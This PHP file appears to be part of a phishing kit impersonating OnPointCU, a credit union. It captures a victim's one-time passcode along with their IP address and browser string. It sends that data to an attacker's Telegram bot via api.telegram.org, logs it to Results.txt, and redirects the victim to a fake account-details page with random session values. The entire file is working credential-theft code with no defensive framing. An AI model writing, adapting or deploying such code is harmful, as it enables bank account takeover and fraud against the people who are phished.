<?php
$zabi = getenv("REMOTE_ADDR");
include('tg.php');
$message .= "🚨OnPointCU - OTP🚨\n";
$message .= "OTP : ".$_POST['otp']."\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "🚨By Forex_Expertz🚨\n";
$cc = $_POST['ccn'];
$subject = "UKNOWING [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: OnPoint <contact>\r\n";
$data = [
    'text' => $message,
    'chat_id' => $chat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );

$file = fopen("Results.txt", 'a');



fwrite($file, $message);

header("Location: info.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>